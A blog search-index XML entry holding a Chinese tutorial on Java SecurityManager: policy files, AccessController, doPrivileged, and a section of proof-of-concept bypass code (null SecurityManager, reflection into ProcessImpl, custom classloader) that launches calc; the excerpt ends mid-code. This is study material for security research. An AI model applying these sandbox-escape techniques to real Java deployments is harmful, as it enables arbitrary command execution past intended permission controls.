<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java SecurityManager学习</title>
      <link href="2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>2021/09/27/Java-SecurityManager%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="0x01-Java-SecurityManager是什么"><a href="#0x01-Java-SecurityManager是什么" class="headerlink" title="0x01 Java SecurityManager是什么"></a>0x01 Java SecurityManager是什么</h3><p>Java SecurityManager是为应用程序定义安全策略的对象，通过策略指定不安全或敏感的操作，安全策略不允许的任何操作都会抛出<code>SecurityException</code>，应用程序可以查询其安全管理器允许的操作。</p><p>Java程序默认情况下都没有开启SecurityManager，如果开启了我们可以通过<code>System.getSecurityManager</code>获取安全管理器<code>java.lang.SecurityManager</code>对象，SecurityManager实现安全策略的管理，允许应用程序在执行可能敏感操作之前确定该操作是否被允许，应用程序可以允许或禁止该操作。</p><p><code>java.lang.SecurityManager</code>包含很多checkXXX形式的方法，checkXXX方法用于检查XXX操作的权限，权限主要分为以下几类：文件、套接字、网络、安全、运行时、属性、AWT、反射和序列化，对于管理这些权限的类是<code>java.io.FilePermission</code>、 <code>java.net.SocketPermission</code>、<code>java.net.NetPermission</code>、 <code>java.security.SecurityPermission</code>、 <code>java.lang.RuntimePermission</code>、<code>java.util.PropertyPermission</code>、 <code>java.awt.AWTPermission</code>、 <code>java.lang.reflect.ReflectPermission</code>、和 <code>java.io.SerializablePermission</code>。</p><h4 id="Java-SecurityManager应用场景："><a href="#Java-SecurityManager应用场景：" class="headerlink" title="Java SecurityManager应用场景："></a>Java SecurityManager应用场景：</h4><p>当运行未知Java程序，该程序可能有恶意代码（操作系统文件、重启系统等），为了防止运行恶意代码对系统产生影响，需要对运行代码的权限进行控制，就要启用Java安全管理器。</p><h4 id="如何启动SecurityManager？"><a href="#如何启动SecurityManager？" class="headerlink" title="如何启动SecurityManager？"></a>如何启动SecurityManager？</h4><p>有两种方式启动：</p><ol><li>启动参数方式：<code>-Djava.security.manager</code>，若要同时指定配置文件的位置通过<code>-Djava.security.manager -Djava.security.policy=&quot;E:/java.policy&quot;</code></li><li>编码下创建SecurityManager实例来启动：</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">SecurityManager securityManager = <span class="keyword">new</span> SecurityManager();</span><br><span class="line">System.setSecurityManager(securityManager);</span><br><span class="line"><span class="comment">// 指定配置文件policy</span></span><br><span class="line">System.setProperty(<span class="string">"java.security.policy"</span>, <span class="string">"file:/E:/myTest.policy"</span>);</span><br></pre></td></tr></table></figure><h4 id="管理SecurityManager配置文件："><a href="#管理SecurityManager配置文件：" class="headerlink" title="管理SecurityManager配置文件："></a>管理SecurityManager配置文件：</h4><p>当配置文件没有被指定时，则会使用默认的安全策略配置文件<code>$JAVA_HOME/jre/lib/security/java.policy</code>。</p><p>安全配置的基本原则如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1、没有配置的权限表示禁止。</span><br><span class="line">2、只能配置允许的权限，不能配置禁止的操作。</span><br><span class="line">3、同一种权限可多次配置，取并集。</span><br><span class="line">4、同一资源的多种权限可用逗号分割。</span><br></pre></td></tr></table></figure><p>以下是默认安全策略文件内容，分为两部分的授权，一是授权基于路径在”file:$/*”的class和jar包所有权限，二是针对权限的细粒度配置，可以参考每种类别的javadoc说明。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">grant codeBase &quot;file:$&#123;&#123;java.ext.dirs&#125;&#125;&#x2F;*&quot; &#123;</span><br><span class="line">        permission java.security.AllPermission;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; default permissions granted to all domains</span><br><span class="line">&#x2F;&#x2F; 定义了所有JAVA程序都拥有的权限，包括停止线程、启动Socket 服务器、读取部分系统属性</span><br><span class="line">grant &#123;</span><br><span class="line">        permission java.lang.RuntimePermission &quot;stopThread&quot;;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; allows anyone to listen on dynamic ports</span><br><span class="line">        permission java.net.SocketPermission &quot;localhost:0&quot;, &quot;listen&quot;;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; &quot;standard&quot; properies that can be read by anyone</span><br><span class="line"></span><br><span class="line">        permission java.util.PropertyPermission &quot;java.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vendor&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vendor.url&quot;, &quot;read&quot;;</span><br><span class="line">        ......</span><br><span class="line"></span><br><span class="line">        permission java.util.PropertyPermission &quot;java.specification.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.specification.vendor&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.specification.name&quot;, &quot;read&quot;;</span><br><span class="line"></span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.specification.version&quot;, &quot;read&quot;;</span><br><span class="line">        permission java.util.PropertyPermission &quot;java.vm.specification.vendor&quot;, &quot;read&quot;;</span><br><span class="line">        ......</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="通过一个例子理解SecurityManager的作用"><a href="#通过一个例子理解SecurityManager的作用" class="headerlink" title="通过一个例子理解SecurityManager的作用"></a>通过一个例子理解SecurityManager的作用</h4><p>下面是一个通过SecurityManager配置授予指定文件读写权限的例子，只有授予文件权限才允许被读或写（代码放在GitHub了），CreatePolicy文件用来创建一个策略配置文件，也可以通过手动创建，TestFilePolicy用来测试文件读写权限。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CreatePolicy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        CreatePolicy createPolicy = <span class="keyword">new</span> CreatePolicy();</span><br><span class="line">        createPolicy.createFile(<span class="string">"E:/myTest.policy"</span>,<span class="string">"E:\\test.txt"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 在指定文件下生成一个policy文件，允许某个文件的读写</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> allowFileName  指定配置文件保存位置</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> policyFileName 指定可读写文件</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">createFile</span><span class="params">(String policyFileName, String allowFileName)</span> </span>&#123;</span><br><span class="line">        allowFileName = allowFileName.replace(<span class="string">"\\"</span>, <span class="string">"/"</span>);</span><br><span class="line">        String policyContent = <span class="string">"grant &#123;\n"</span> +</span><br><span class="line">                <span class="string">"    permission java.io.FilePermission \""</span> + allowFileName + <span class="string">"\",\"read,write\";\n"</span> +</span><br><span class="line">                <span class="string">"&#125;;"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileWriter fileWriter = <span class="keyword">new</span> FileWriter(policyFileName);</span><br><span class="line">            fileWriter.write(policyContent);</span><br><span class="line">            fileWriter.flush();</span><br><span class="line">            fileWriter.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TestFilePolicy</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        String policyFileName = <span class="string">"E:/fileTest.policy"</span>;</span><br><span class="line">        String allowFileName = <span class="string">"E:/test.txt"</span>;</span><br><span class="line">        <span class="comment">// 1、首先设置好policy文件</span></span><br><span class="line">        CreatePolicy createPolicy = <span class="keyword">new</span> CreatePolicy();</span><br><span class="line">        createPolicy.createFile(policyFileName, allowFileName);</span><br><span class="line">        System.setProperty(<span class="string">"java.security.policy"</span>, <span class="string">"file:/"</span> + policyFileName);</span><br><span class="line">        <span class="comment">// 2、启动 SecurityManager</span></span><br><span class="line">        SecurityManager securityManager = <span class="keyword">new</span> SecurityManager();</span><br><span class="line">        System.setSecurityManager(securityManager);</span><br><span class="line">        <span class="comment">// 3、尝试写文件</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            securityManager.checkWrite(allowFileName);</span><br><span class="line">            write(<span class="keyword">new</span> File(allowFileName));</span><br><span class="line">            System.out.println(<span class="string">"file write ok"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">            System.out.println(e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">write</span><span class="params">(File file)</span> <span class="keyword">throws</span> Throwable </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            FileWriter fileWriter = <span class="keyword">new</span> FileWriter(file);</span><br><span class="line">            fileWriter.write(<span class="string">"test"</span>);</span><br><span class="line">            fileWriter.flush();</span><br><span class="line">            fileWriter.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>执行上面代码，由于通过策略文件授予了<code>E:/test.txt</code>文件的读写权限，应用可以成功写文件；如果删除注释中的1、2步骤，执行代码，由于没有配置安全管理器，应用可以任意写文件；如果删除<code>System.setProperty(&quot;java.security.policy&quot;, &quot;file:/&quot; + policyFileName);</code>对策略文件的配置，使用默认策略，写文件会失败，因为默认配置文件没有授予文件写的权限。</p><p>因此通过上面这个例子，我们可以理解SecurityManager主要的作用就是配置权限，管理安全策略，防止不必要的授权。</p><h3 id="0x02-AccessController"><a href="#0x02-AccessController" class="headerlink" title="0x02 AccessController"></a>0x02 AccessController</h3><h4 id="域模型："><a href="#域模型：" class="headerlink" title="域模型："></a>域模型：</h4><p>参考：<a href="https://tech101.cn/2019/08/15/AccessController%E7%9A%84doPrivileged%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%9C%E7%94%A8#%E5%9F%9F%E6%A8%A1%E5%9E%8B" target="_blank" rel="noopener">https://tech101.cn/2019/08/15/AccessController%E7%9A%84doPrivileged%E6%96%B9%E6%B3%95%E7%9A%84%E4%BD%9C%E7%94%A8#%E5%9F%9F%E6%A8%A1%E5%9E%8B</a></p><p>在当前最新的Java安全模型中，引入了 域（Domain）的概念。虚拟机会将所有代码加载到不同的域中。其中系统域负责和操作系统的资源进行交互，而各个应用域对系统资源的访问需要通过系统域的代理来实现受限访问。JVM中的不同域关联了不同的权限，处于域中的类将拥有这个域所包含的所有权限。</p><p>在域模型中，为了实现权限控制，涉及到一些概念，包括：</p><ol><li>代码源(code source)：代码源表示类的来源URL地址，代码源由类加载器负责创建和管理。</li><li>权限（permission）：封装特定操作的请求</li><li>策略（policy）：策略是一组权限的总称，用于确定权限应该用于哪些代码源。</li><li>保护域（protection domain）：封装代码和代码所拥有的权限，<strong>保护域可以理解为是代码源和权限映射关系的集合</strong>，一个类如果属于一个保护域，那么这个类将拥有这个域中的所有权限。</li></ol><p>这里codeBase相当于制定了代码源 哪些代码，<code>permission java.lang.FilePermission &quot;read&quot;;</code>指定了代码源拥有的权限，而保护域会将多个code source和多个permission之间的关系进行映射</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">grant codeBase &quot;file:&#x2F;code&#x2F;A&#x2F;*&quot; &#123;</span><br><span class="line">        permission java.lang.FilePermission &quot;file1&quot;,&quot;read&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">grant codeBase &quot;file:&#x2F;code&#x2F;B&#x2F;*&quot; &#123;</span><br><span class="line">        permission java.lang.FilePermission &quot;file1&quot;,&quot;read,write&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面策略对应的域如下：</p><p><img src="/imgs/image-20210929144409923.png" alt="image-20210929144409923"></p><h4 id="AccessController-checkPermission工作机制"><a href="#AccessController-checkPermission工作机制" class="headerlink" title="AccessController.checkPermission工作机制"></a><code>AccessController.checkPermission</code>工作机制</h4><p>上面例子中通过<code>securityManager.checkWrite(allowFileName);</code>检查文件的写权限，checkWrite方法调用checkPermission处理，最终委托给<code>AccessController.checkPermission(perm);</code>检查。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkWrite</span><span class="params">(String file)</span> </span>&#123;</span><br><span class="line">    checkPermission(<span class="keyword">new</span> FilePermission(file, securityConstants.FILE_WRITE_ACTION));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">checkPermission</span><span class="params">(Permission perm)</span> </span>&#123;</span><br><span class="line">    java.security.AccessController.checkPermission(perm);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>AccessController判断权限的主体是调用者（Caller）。基于访问控制的规则，AccessController在进行权限判断的时候，它不仅仅检查当前Caller是否拥有权限，而是对整个调用链上的所有Caller进行权限检查。对调用链上的每个Caller，都会基于它们各自所属的ProtectionDomain中的权限集合进行检查。当满足下面的二个条件，则表示访问被授权：<br>1、在当前调用链上，从当前的Caller到初始Caller之间的所有Caller都能被各自所属的ProtectionDomain中的权限授权。<br>2、在当前调用链上，其中有一个Caller被标记为privilege并且被授权，同时接下来调用的过程中所有调用都能被各自的域授权。<br>如果上述的二点有任何一点不满足，则<code>AccessController.checkPermission()</code>会抛出<code>AccessControlException</code>。</p></blockquote><h4 id="AccessController-doPrivileged-授予特权"><a href="#AccessController-doPrivileged-授予特权" class="headerlink" title="AccessController.doPrivileged()授予特权"></a>AccessController.doPrivileged()授予特权</h4><p>Caller如何被标记为privilege？可以调用AccessController.doPrivileged()临时授权。</p><p>将上面TestFilePolicy例子改写，上面的例子只有文件的写权限，我们需要临时用到读权限，通过doPrivileged满足。在main中添加调用：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 4、用AccessController.doPrivileged赋予写文件特权</span></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedExceptionAction&lt;Void&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Void <span class="title">run</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">"file read ok"</span>);</span><br><span class="line">                read(<span class="keyword">new</span> File(allowFileName));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable throwable) &#123;</span><br><span class="line">                throwable.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125; <span class="keyword">catch</span> (PrivilegedActionException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="0x03-Java-SecurityManager绕过"><a href="#0x03-Java-SecurityManager绕过" class="headerlink" title="0x03 Java SecurityManager绕过"></a>0x03 Java SecurityManager绕过</h3><p>本次学习实验参考的<a href="https://github.com/codeplutos/java-security-manager-bypass。" target="_blank" rel="noopener">https://github.com/codeplutos/java-security-manager-bypass。</a></p><p>1、通过授权RuntimePermission为setSecurityManager和设置SecurityManager为null，绕过check</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SetSecurityManagerNullBypass</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> SetSecurityManagerNullBypass().exec();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">exec</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">//TODO 编译运行 -Djava.security.manager -Djava.security.policy==your.policy</span></span><br><span class="line">        <span class="comment">// grant &#123;</span></span><br><span class="line">        <span class="comment">//    permission java.lang.RuntimePermission "setSecurityManager";</span></span><br><span class="line">        <span class="comment">// &#125;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 设置SecurityManager为null 绕过check</span></span><br><span class="line">        System.setSecurityManager(<span class="keyword">null</span>);</span><br><span class="line">        <span class="comment">// 执行命令</span></span><br><span class="line">        Runtime runtime = Runtime.getRuntime();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            runtime.exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2、通过反射权限执行恶意代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassByReflection</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//TODO compile and run with: -Djava.security.manager -Djava.security.policy==bypass-by-reflection.policy</span></span><br><span class="line">        <span class="comment">// bypass-by-reflection.policy:</span></span><br><span class="line">        <span class="comment">// grant &#123;</span></span><br><span class="line">        <span class="comment">//    permission java.lang.reflect.ReflectPermission "suppressAccessChecks";</span></span><br><span class="line">        <span class="comment">//    permission java.lang.RuntimePermission "accessDeclaredMembers";</span></span><br><span class="line">        <span class="comment">// &#125;;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">//        executeCommandWithReflection("calc");</span></span><br><span class="line">        exec(<span class="string">"calc"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">exec</span><span class="params">(String command)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(command);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">executeCommandWithReflection</span><span class="params">(String command)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class clz = Class.forName(<span class="string">"java.lang.ProcessImpl"</span>);</span><br><span class="line">            Method method = clz.getDeclaredMethod("start", String[].class, Map.class, String.class, ProcessBuilder.Redirect[].class, boolean.class);</span><br><span class="line">            method.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">            method.invoke(clz, <span class="keyword">new</span> String[]&#123;command&#125;, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">null</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>3、通过赋予加载器权限，自定义加载器来执行恶意代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">BypassByClassloader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//TODO compile and run with: -Djava.security.manager -Djava.security.policy==bypass-by-createclassloader.policy</span></span><br><span class="line">        <span class="comment">// grant&#123;</span></span><br><span class="line">        <span class="comment">//    permission java.lang.RuntimePermission "createClassLoader";</span></span><br><span class="line">        <span class="comment">//    permission java.io.FilePermission "&lt;&lt;ALL FILES&gt;&gt;", "read";</span></span><br><span class="line">        <span class="comment">// &#125;;</span></span><br><span class="line"></span><br><span class="line">        MyClassLoader mcl = <span class="keyword">new</span> MyClassLoader();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Class&lt;?&gt; c1 = Class.forName(<span class="string">"com.r17a.commonvuln.securitymiconfig.securitymanager.Evil"</span>, <span class="keyword">true</span>, mcl);</span><br><span class="line">            Object obj = c1.newInstance();</span><br><span class="line">            System.out.println(obj.getClass().getClassLoader());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException | IllegalAccessException | InstantiationException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Evil</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"calc"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClassLoader</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyClassLoader</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyClassLoader</span><span class="params">(ClassLoader parent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(parent);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> Class&lt;?&gt; findClass(String name) <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        File file = getClassFile(name);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = getClassBytes(file);</span><br><span class="line">            <span class="comment">//call defineClazz not super.defineClass</span></span><br><span 